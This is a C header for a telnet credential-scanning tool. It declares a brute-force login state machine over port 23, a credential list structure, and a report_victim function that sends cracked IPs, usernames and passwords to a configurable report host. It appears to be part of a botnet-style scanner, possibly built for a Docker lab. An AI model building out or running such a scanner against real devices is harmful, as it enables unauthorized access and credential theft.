#ifndef SCANNER_H
#define SCANNER_H

#include <stdint.h>

#define TELNET_PORT 23
#define REPORT_HOST "0.0.0.0"    // mudar para ser mm ip no docker (maybe env variable)
#define REPORT_PORT 5000          // same as above

typedef struct {
    char user[32];
    char pass[32];
} Credential;


typedef enum {
    STATE_INIT,
    STATE_CONNECTING,
    STATE_WAITING_USERNAME,
    STATE_WAITING_PASSWORD,
    STATE_WAITING_ENABLE,
    STATE_RESULT
} TelnetState;


typedef struct {
    int fd;
    uint32_t ip;
    TelnetState state;
    time_t last_activity;
    int cred_index; // which credential is being used
    int recv_len;
    char recv_buf[256];
} ScanTarget;

void scanner_init(void);
void scanner_run(const char *subnet, int prefix_len);
void report_victim(uint32_t ip, const char *user, const char *pass);

#endif
